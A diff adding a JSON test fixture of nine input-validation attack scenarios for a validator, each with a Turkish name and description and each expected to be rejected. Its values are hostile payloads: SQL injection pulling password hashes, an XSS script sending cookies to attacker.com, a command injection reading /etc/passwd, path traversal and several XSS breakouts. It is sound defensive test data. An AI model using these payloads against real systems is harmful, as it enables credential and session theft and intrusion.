@@ -1,0 +1,83 @@
+[
+  {
+    "scenario_id": "SCN-INPUT-01",
+    "name": "SQL_Enjeksiyonu_Union_Saldirisi",
+    "field": "username",
+    "value": "' UNION SELECT username, password_hash FROM admin_users --",
+    "expected_threat": "SQL_INJECTION",
+    "expected_valid": false,
+    "description": "Kullanici adi alaninda SQL sorgu birlestirme enjeksiyonu denemesi."
+  },
+  {
+    "scenario_id": "SCN-INPUT-02",
+    "name": "Reflected_XSS_Zararli_Script_Etiketi",
+    "field": "bio_comment",
+    "value": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
+    "expected_threat": "XSS_SCRIPT",
+    "expected_valid": false,
+    "description": "Biyografi alanina oturum calici XSS script enjeksiyonu."
+  },
+  {
+    "scenario_id": "SCN-INPUT-03",
+    "name": "Isletim_Sistemi_Komut_Enjeksiyonu",
+    "field": "username",
+    "value": "admin; cat /etc/passwd",
+    "expected_threat": "COMMAND_INJECTION",
+    "expected_valid": false,
+    "description": "Komut ayirici noktalı virgul ile sistem parolalarini okuma denemesi."
+  },
+  {
+    "scenario_id": "SCN-INPUT-04",
+    "name": "Dizin_Gecisi_Cift_URL_Kodlamasi",
+    "field": "bio_comment",
+    "value": "%252e%252e%252f%252e%252e%252fetc/passwd",
+    "expected_threat": "PATH_TRAVERSAL",
+    "expected_valid": false,
+    "description": "Filtre atlatmak icin cift url kodlanmis path traversal saldirisi."
+  },
+  {
+    "scenario_id": "SCN-INPUT-05",
+    "name": "Null_Byte_Enjeksiyonu",
+    "field": "username",
+    "value": "guvenli_dosya.pdf%00.exe",
+    "expected_threat": "NULL_BYTE_INJECTION",
+    "expected_valid": false,
+    "description": "C kokenli dosya sonlandirma null byte saldirisi."
+  },
+  {
+    "scenario_id": "SCN-INPUT-06",
+    "name": "Asiri_Uzunluk_Buffer_Sinir_Asimi",
+    "field": "username",
+    "value": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "expected_threat": "LENGTH_LIMIT",
+    "expected_valid": false,
+    "description": "Maksimum 30 karakter olan alana asiri uzun girdi gondererek buffer/limit asimi denemesi."
+  },
+  {
+    "scenario_id": "SCN-INPUT-07",
+    "name": "HTML_Attribute_Breakout_Tirnak_Kirilmasi",
+    "field": "full_name",
+    "value": "\"><script>alert('attr_breakout')</script>",
+    "expected_threat": "XSS_SCRIPT",
+    "expected_valid": false,
+    "description": "HTML input oznitelik baglamindan cikip script calistirma denemesi."
+  },
+  {
+    "scenario_id": "SCN-INPUT-08",
+    "name": "JavaScript_Baglami_Kacis_Saldirisi",
+    "field": "username",
+    "value": "'-alert(1)-'",
+    "expected_threat": "FORMAT_VIOLATION",
+    "expected_valid": false,
+    "description": "JS inline degiskeninden tirnak kirarak ifade calistirma denemesi."
+  },
+  {
+    "scenario_id": "SCN-INPUT-09",
+    "name": "Guvensiz_Protokol_Javascript_URL",
+    "field": "homepage_url",
+    "value": "javascript:alert(document.domain)",
+    "expected_threat": "XSS_SCRIPT",
+    "expected_valid": false,
+    "description": "Web sitesi linki yerine javascript sahte protokol enjeksiyonu."
+  }
+]
